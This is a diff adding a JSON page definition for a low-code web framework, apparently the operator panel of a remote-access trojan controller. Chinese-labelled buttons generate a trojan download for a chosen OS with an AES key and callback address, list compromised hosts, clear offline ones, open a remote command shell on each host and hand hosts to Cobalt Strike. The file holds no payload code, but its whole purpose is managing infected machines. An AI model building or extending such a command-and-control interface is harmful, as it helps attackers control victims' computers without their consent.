@@ -1,0 +1,269 @@
+{
+  "type": "crud",
+  "id": "u:674ac31ee8b1",
+  "api": {
+    "method": "get",
+    "url": "/api/getNote",
+    "messages": {
+    },
+    "dataType": "json"
+  },
+  "mode": "table",
+  "filter": {
+    "title": "配置",
+    "submitText": "",
+    "body": [
+      {
+        "type": "input-text",
+        "label": "aeskey",
+        "name": "aeskey",
+        "id": "u:f97198290903",
+        "themeConfig": {
+        },
+        "value": "",
+        "required": true,
+        "validations": {
+          "maxLength": 16
+        },
+        "showCounter": false
+      },
+      {
+        "type": "select",
+        "label": "os",
+        "name": "os",
+        "options": [
+          {
+            "label": "linux",
+            "value": "linux"
+          },
+          {
+            "label": "windows",
+            "value": "windows"
+          },
+          {
+            "label": "darwin",
+            "value": "darwin"
+          }
+        ],
+        "id": "u:f7beb120098c",
+        "multiple": false,
+        "themeConfig": {
+        },
+        "searchable": false,
+        "onEvent": {
+          "change": {
+            "weight": 0,
+            "actions": [
+            ]
+          }
+        }
+      },
+      {
+        "type": "input-text",
+        "label": "adminaddr",
+        "name": "adminaddr",
+        "id": "u:30608fd493b1",
+        "placeholder": "note地址",
+        "value": "",
+        "required": true,
+        "validations": {
+          "minLength": 4
+        },
+        "validationErrors": {
+          "minLength": "请输入note地址"
+        },
+        "autoFill": {
+        }
+      },
+      {
+        "type": "button-group",
+        "buttons": [
+          {
+            "type": "button",
+            "label": "木马下载",
+            "onEvent": {
+              "click": {
+                "actions": [
+                  {
+                    "args": {
+                      "params": {
+                        "aeskey": "${aeskey}",
+                        "adminaddr": "${adminaddr}",
+                        "os": "${os}"
+                      },
+                      "url": "/api/down"
+                    },
+                    "actionType": "url"
+                  }
+                ]
+              }
+            },
+            "id": "u:c75150a014a7",
+            "size": "md",
+            "themeConfig": {
+            }
+          },
+          {
+            "type": "button",
+            "label": "清除下线主机",
+            "onEvent": {
+              "click": {
+                "actions": [
+                  {
+                    "args": {
+                      "options": {
+                        "silent": true
+                      },
+                      "api": {
+                        "url": "/api/RefreshHost",
+                        "method": "get",
+                        "messages": {
+                        },
+                        "data": {
+                          "adminaddr": "${adminaddr}",
+                          "aeskey": "${aeskey}"
+                        }
+                      }
+                    },
+                    "outputVar": "test",
+                    "actionType": "ajax"
+                  }
+                ]
+              }
+            },
+            "id": "u:772cad7571b0"
+          },
+          {
+            "type": "button",
+            "label": "刷新",
+            "onEvent": {
+              "click": {
+                "actions": [
+                  {
+                    "componentId": "u:3a2b834b54f5",
+                    "args": {
+                    },
+                    "actionType": "submit"
+                  }
+                ]
+              }
+            },
+            "id": "u:3a35a4869ea1"
+          }
+        ],
+        "id": "u:678d22b24fef"
+      }
+    ],
+    "id": "u:3a2b834b54f5",
+    "actions": [
+    ]
+  },
+  "bulkActions": [
+  ],
+  "quickSaveApi": "",
+  "quickSaveItemApi": "",
+  "draggable": true,
+  "messages": {
+  },
+  "primaryField": "id",
+  "syncLocation": true,
+  "features": [
+  ],
+  "filterColumnCount": 4,
+  "filterSettingSource": [
+    "hostName",
+    "noteaddr"
+  ],
+  "footerToolbar": [
+  ],
+  "headerToolbar": [
+    {
+      "type": "filter-toggler",
+      "tpl": "内容",
+      "wrapperComponent": "",
+      "id": "u:8a1601d887c5",
+      "align": "left"
+    }
+  ],
+  "perPageField": "",
+  "pageField": "",
+  "columns": [
+    {
+      "label": "主机名",
+      "type": "text",
+      "name": "hostName",
+      "id": "u:f466a905e14e",
+      "placeholder": "-"
+    },
+    {
+      "label": "Noteaddr",
+      "type": "text",
+      "name": "noteaddr",
+      "id": "u:6a91cec8097e"
+    },
+    {
+      "type": "text",
+      "label": "os",
+      "id": "u:2a91cec8097e",
+      "name": "os"
+    },
+    {
+      "type": "button-group",
+      "buttons": [
+        {
+          "type": "button",
+          "label": "命令执行",
+          "onEvent": {
+            "click": {
+              "actions": [
+                {
+                  "args": {
+                    "url": "/shell"
+                  },
+                  "actionType": "link",
+                  "data": {
+                    "noteaddr": "${noteaddr}",
+                    "hostname": "${hostname}",
+                    "aeskey": "${aeskey}"
+                  }
+                }
+              ]
+            }
+          },
+          "id": "u:47973890d11b",
+          "placeholder": "-"
+        },
+        {
+          "type": "button",
+          "label": "上线cs",
+          "onEvent": {
+            "click": {
+              "actions": [
+                {
+                  "args": {
+                    "url": "/cs"
+                  },
+                  "actionType": "link",
+                  "data": {
+                    "noteaddr": "${noteaddr}",
+                    "aeskey": "${aeskey}"
+                  }
+                }
+              ]
+            }
+          },
+          "id": "u:7a47ecd5e7f7"
+        }
+      ],
+      "id": "u:e572d4b38861",
+      "label": "功能",
+      "vertical": false,
+      "placeholder": "-"
+    }
+  ],
+  "perPageAvailable": [
+    10
+  ],
+  "loadDataOnce": true,
+  "silentPolling": true
+}
